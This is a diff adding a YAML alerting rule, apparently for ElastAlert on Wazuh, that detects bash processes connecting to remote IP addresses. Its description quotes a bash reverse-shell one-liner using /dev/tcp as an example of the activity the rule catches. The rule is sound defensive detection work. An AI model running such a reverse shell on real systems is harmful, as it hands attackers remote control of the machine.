@@ -1,0 +1,17 @@
+alert:
+- debug
+description: Detects a bash contecting to a remote IP address (often found when actors
+  do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+filter:
+- query:
+    query_string:
+      query: (process_path.keyword:*\/bin\/bash AND (NOT (dst_ip_addr:("127.0.0.1"
+        OR "0.0.0.0"))))
+index: wazuh-alerts*
+name: net_connection_lnx_back_connect_shell_dev
+priority: 1
+realert:
+  minutes: 0
+type: any
+
+is_enabled: false
